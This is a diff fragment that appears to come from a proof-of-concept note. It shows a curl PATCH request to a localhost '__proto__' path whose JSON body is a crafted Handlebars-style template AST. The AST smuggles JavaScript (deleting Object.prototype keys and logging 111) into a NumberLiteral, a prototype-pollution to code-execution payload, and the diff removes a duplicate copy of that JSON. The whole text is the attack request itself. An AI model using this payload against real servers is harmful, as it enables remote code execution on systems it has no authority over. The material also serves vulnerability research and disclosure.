@@ -4,5 +4,4 @@ curl -X PATCH http://localhost:8000/jackfromeast/__proto__ \
      -d '{"body": [{"type": "MustacheStatement","path": 0,"params": [{"type": "NumberLiteral","value": "for (var a in {}) { delete Object.prototype[a]; }; console.log(111)"}],"loc": {"start": 0,"end":0}}], "type": "Program"}'
 
 
-{"body": [{"type": "MustacheStatement","path": 0,"params": [{"type": "NumberLiteral","value": "for (var a in {}) { delete Object.prototype[a]; }; console.log(111)"}],"loc": {"start": 0,"end":0}}], "type": "Program"}
 
